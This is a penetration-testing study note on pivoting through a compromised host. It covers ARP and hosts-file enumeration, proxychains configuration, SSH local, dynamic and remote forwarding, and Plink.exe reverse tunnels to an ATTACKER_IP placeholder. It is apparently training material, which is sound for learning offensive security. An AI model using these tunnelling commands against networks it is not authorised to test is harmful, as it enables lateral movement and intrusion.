# pivot

- Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network.

two main methods for pivoting :

1. tunnelling/proxying
2. Port forwarding

A proxy is good if we want to redirect lots of different kinds of traffic into our target network. eg to access multiple ports on multiple different machines.

Port Forwarding allows us to access a single port (or a small range) on a target device. 

## Enumeration

five possible ways to enumerate a network through a compromised host

- Using material found on the machine. The hosts file or ARP cache, for example
- Using pre-installed tools
- Using statically compiled tools
- Using scripting techniques
- Using local tools through a proxy

`arp -a` : used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently.

`/etc/hosts` or `C:\Windows\System32\drivers\etc\hosts` : static mapping found.

##  Proxychains & Foxyproxy 

When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network. 

### proxychains

- its slowdown connection.

proxy netcat  through a proxy, you could use the command:

`proxychains nc 172.16.0.10 23`

Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file.located at `/etc/proxychains.conf`
the order proxychains look for config file is

```
    The current directory (i.e. ./proxychains.conf)
    ~/.proxychains/proxychains.conf
    /etc/proxychains.conf

```

we interested mainly in config file :

```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050

```

here we can specified port.

## SSH Tunnelling / Port Forwarding 

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target.

`ssh -L LOCAL_PORT:127.0.0.1:DESTINATION_PORT [USER@]SSH_SERVER -fN`

`-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.


***

Proxies are made using the `-D` switch.

`ssh -D 1337 user@172.16.0.5 -fN` .

This is useful when combined with a tool such as proxychains. 

**Remote port forwading**

`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKER_IP`


## Plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client.

Plink (PuTTY Link) is a command-line connection tool similar to UNIX ssh.

-  create a reverse connection.

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using 
`sudo apt install putty-tools`

After downloading the tool, conversion can be done with:
`puttygen KEYFILE -o OUTPUT_KEY.ppk`